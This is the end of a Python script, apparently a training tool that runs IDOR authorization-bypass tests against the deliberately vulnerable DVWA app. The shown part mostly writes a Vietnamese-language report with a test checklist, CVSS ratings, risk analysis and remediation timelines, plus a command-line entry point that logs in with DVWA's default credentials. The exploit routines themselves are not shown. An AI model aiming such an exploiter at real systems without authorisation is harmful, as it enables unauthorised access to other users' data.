            f.write("4. Xác minh các kiểm tra ủy quyền bị thiếu\n")
            f.write("5. So sánh quyền truy cập giữa admin và non-admin users\n")
            f.write("6. Test với các payload IDOR khác nhau (numeric IDs, SQLi, etc.)\n\n")
            f.write("7. Thử replay attack với Burp-style request copying\n")
            f.write("8. Kiểm tra session validation và CSRF protection\n")
            f.write("9. Test các HTTP methods khác nhau (POST, PUT, DELETE, PATCH)\n")
            f.write("10. Kiểm tra parameter tampering và input validation\n\n")

            f.write("MỨC ĐỘ NGUY HIỂM:\n")
            f.write("-"*50 + "\n")

            # LOW Level
            if results.get('low_level'):
                f.write("CẤP ĐỘ LOW: CAO (HIGH)\n")
                f.write("- CVSS Score: 7.5-8.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)\n")
                f.write("- Cho phép truy cập trái phép vào chức năng quản trị\n")
                f.write("- Có thể dẫn đến leo thang đặc quyền (privilege escalation)\n")
                f.write("- Vi phạm tính toàn vẹn của hệ thống\n")
                f.write("- Rò rỉ thông tin nhạy cảm (information disclosure)\n\n")

            # MEDIUM Level
            if results.get('medium_level'):
                f.write("CẤP ĐỘ MEDIUM: CAO (HIGH)\n")
                f.write("- CVSS Score: 8.0-8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)\n")
                f.write("- Rò rỉ thông tin người dùng nhạy cảm (PII breach)\n")
                f.write("- Vi phạm các quy định về bảo vệ dữ liệu (GDPR, PDPA, CCPA)\n")
                f.write("- Có thể kết hợp với các lỗ hổng khác để tấn công\n")
                f.write("- Dẫn đến financial và reputational damage\n\n")

            # HIGH Level
            if results.get('high_level'):
                f.write("CẤP ĐỘ HIGH: CỰC KỲ NGUY HIỂM (CRITICAL SEVERITY)\n")
                f.write("- CVSS Score: 9.0-9.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)\n")
                f.write("- CHO PHÉP THAY ĐỔI DỮ LIỆU TRÁI PHÉP (data integrity violation)\n")
                f.write("- Có thể dẫn đến data tampering và data corruption\n")
                f.write("- Phá vỡ tính bảo mật và toàn vẹn của hệ thống\n")
                f.write("- Có thể dẫn đến business logic manipulation\n")
                f.write("- Nguy cơ financial fraud và data manipulation\n")
                f.write("- Compliance violations nghiêm trọng\n")
                f.write("- Cần khắc phục NGAY LẬP TỨC (immediate remediation)\n\n")

            f.write("PHÂN TÍCH RỦI RO:\n")
            f.write("-"*50 + "\n")
            
            f.write("1. RỦI RO TÀI CHÍNH:\n")
            if results.get('high_level') or results.get('impossible_level'):
                f.write("   - Rất cao: Có thể dẫn đến financial loss trực tiếp\n")
                f.write("   - Chi phí khắc phục: Cao đến rất cao\n")
                f.write("   - Potential fines: $10,000 - $100,000+ (tùy regulation)\n")
            elif results.get('medium_level'):
                f.write("   - Cao: Có thể dẫn đến regulatory fines\n")
                f.write("   - Chi phí khắc phục: Trung bình đến cao\n")
                f.write("   - Potential fines: $1,000 - $50,000 (GDPR/PDPA violations)\n")
            else:
                f.write("   - Trung bình: Chủ yếu là chi phí khắc phục\n")
            
            f.write("\n2. RỦI RO DANH TIẾNG:\n")
            if results.get('high_level'):
                f.write("   - Rất cao: Thiệt hại nghiêm trọng đến brand reputation\n")
                f.write("   - Customer trust: Bị phá vỡ nghiêm trọng\n")
            elif results.get('medium_level'):
                f.write("   - Cao: Mất lòng tin của khách hàng\n")
                f.write("   - PR crisis: Cần có communication plan\n")
            
            f.write("\n3. RỦI RO PHÁP LÝ:\n")
            f.write("   - GDPR Violation: Up to €20 million or 4% of global turnover\n")
            f.write("   - PDPA Violation: Up to 5% of annual turnover in Vietnam\n")
            f.write("   - CCPA Violation: $2,500-$7,500 per violation\n")
            f.write("   - Data Protection Laws: Multiple jurisdictions affected\n")
            
            f.write("\n4. RỦI RO VẬN HÀNH:\n")
            if results.get('high_level'):
                f.write("   - Rất cao: Hệ thống có thể bị compromise hoàn toàn\n")
                f.write("   - Business disruption: High probability\n")
                f.write("   - Data corruption: Critical risk\n")

            f.write("KHUYẾN NGHỊ ƯU TIÊN:\n")
            f.write("-"*50 + "\n")
            
            if results.get('high_level'):
                f.write("1. ƯU TIÊN CAO (HIGH PRIORITY - SEV-2):\n")
                f.write("   - Ngay lập tức: Implement additional monitoring\n")
                f.write("   - Trong 4 giờ: Review và fix update APIs\n")
                f.write("   - Trong 24 giờ: Implement CSRF protection\n")
                f.write("   - Trong 48 giờ: Security testing và validation\n\n")
            
            if results.get('medium_level'):
                f.write("2. ƯU TIÊN TRUNG BÌNH-CAO (MEDIUM-HIGH PRIORITY - SEV-3):\n")
                f.write("   - Trong 24 giờ: Secure all API endpoints\n")
                f.write("   - Trong 48 giờ: Implement proper access control\n")
                f.write("   - Trong 1 tuần: Data access audit và logging\n\n")
            
            if results.get('low_level'):
                f.write("3. ƯU TIÊN TRUNG BÌNH (MEDIUM PRIORITY - SEV-4):\n")
                f.write("   - Trong 48 giờ: Implement server-side authorization\n")
                f.write("   - Trong 1 tuần: Code review cho client-side checks\n")
                f.write("   - Trong 2 tuần: Security training for developers\n\n")

            f.write("TIMELINE KHẮC PHỤC ĐỀ XUẤT:\n")
            f.write("-"*50 + "\n")
            
            has_critical = results.get('high_level')
            
            if has_critical:
                f.write("KHẨN CẤP (0-24 giờ):\n")
                f.write("  - Áp dụng bản vá khẩn cấp cho lỗ hổng nghiêm trọng\n")
                f.write("  - Phản ứng sự cố và ngăn chặn thiệt hại\n")
                f.write("  - Tăng cường giám sát hệ thống\n")
                f.write("  - Thông báo cho các bên liên quan\n\n")
            
                f.write("NGẮN HẠN (24 giờ - 1 tuần):\n")
                f.write("  - Sửa tất cả lỗ hổng mức độ cao\n")
                f.write("  - Triển khai ghi nhật ký toàn diện\n")
                f.write("  - Xem xét cấu hình bảo mật\n")
                f.write("  - Kiểm tra toàn bộ endpoint API\n")
                f.write("  - Triển khai CSRF protection\n\n")
            
            f.write("TRUNG HẠN (1-4 tuần):\n")
            f.write("  - Triển khai thực hành bảo mật tốt nhất\n")
            f.write("  - Đào tạo bảo mật cho nhà phát triển\n")
            f.write("  - Xem xét và tái cấu trúc mã nguồn\n")
            f.write("  - Kiểm thử xâm nhập\n")
            f.write("  - Triển khai mã hóa dữ liệu\n")
            f.write("  - Cập nhật chính sách bảo mật\n\n")
            
            f.write("DÀI HẠN (1-3 tháng):\n")
            f.write("  - Xem xét kiến trúc bảo mật\n")
            f.write("  - Triển khai khung bảo mật (OWASP, NIST)\n")
            f.write("  - Giám sát bảo mật liên tục (SIEM)\n")
            f.write("  - Đánh giá bảo mật định kỳ\n")
            f.write("  - Triển khai DevSecOps\n")
            f.write("  - Xây dựng văn hóa bảo mật trong tổ chức\n")
            
            f.write("\n2. HOẠT ĐỘNG KIỂM TRA BỔ SUNG:\n")
            f.write("-"*50 + "\n")
            f.write("   - Kiểm tra toàn diện tất cả endpoint API\n")
            f.write("   - Thử nghiệm với nhiều vai trò người dùng khác nhau\n")
            f.write("   - Phân tích luồng nghiệp vụ tìm lỗ hổng ủy quyền\n")
            f.write("   - Đánh giá mã nguồn toàn bộ ứng dụng\n")
            f.write("   - Quét bảo mật tự động (SAST/DAST/IAST)\n")
            f.write("   - Kiểm thử xâm nhập thủ công chuyên sâu\n")
            f.write("   - Đánh giá Red team mô phỏng tấn công thực tế\n")
            f.write("   - Kiểm tra compliance với tiêu chuẩn bảo mật\n")
        
        print(f"\n{Fore.GREEN}[+] Report saved to: {report_file}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='DVWA Authorization Bypass IDOR Exploiter')
    parser.add_argument('-u', '--url', required=True, help='DVWA base URL (e.g., http://localhost:42001)')
    parser.add_argument('-l', '--level', choices=['low', 'medium', 'high', 'all'], default='all', 
                       help='Security level to test (low, medium, high, all)')
    
    args = parser.parse_args()
    
    # Create exploiter instance
    exploiter = DVVAAuthBypassExploiter(args.url)
    
    # Run tests based on level
    if args.level == 'all':
        exploiter.automated_full_test()
    elif args.level == 'low':
        exploiter.print_banner()
        if exploiter.login('gordonb', 'abc123'):
            exploiter.exploit_low_level()
    elif args.level == 'medium':
        exploiter.print_banner()
        if exploiter.login('gordonb', 'abc123'):
            exploiter.exploit_medium_level()
    elif args.level == 'high':
        exploiter.print_banner()
        if exploiter.login('gordonb', 'abc123'):
            exploiter.exploit_high_level()

if __name__ == "__main__":
    main()
